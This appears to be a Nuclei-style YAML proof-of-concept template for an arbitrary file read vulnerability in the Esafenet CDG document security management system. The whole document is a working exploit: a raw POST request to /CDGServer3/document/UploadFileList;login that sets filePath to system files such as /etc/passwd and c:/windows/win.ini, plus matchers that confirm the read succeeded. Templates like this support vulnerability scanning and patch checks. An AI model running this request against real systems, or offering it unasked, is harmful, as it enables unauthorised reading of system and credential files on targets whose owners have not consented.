id: poc-yaml-yisaitong-esafenet-uploadfilelist-anyfile-read
info:
  name: 亿赛通电子文档安全管理系统 UploadFileList 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

variables:
  file:
    - "c:/windows/win.ini"
    - "/etc/passwd"

http:
  - raw:
      - |
        POST /CDGServer3/document/UploadFileList;login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=VeiwUploadFile&filePath={{file}}&fileName1=111111
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        condition: or
        words:
          - "; for 16-bit app support"
          - "root:"
      - type: word
        condition: or
        words:
          - "[files]"
          - "/bin"
      - type: word
        negative: true
        words:
          - "<"
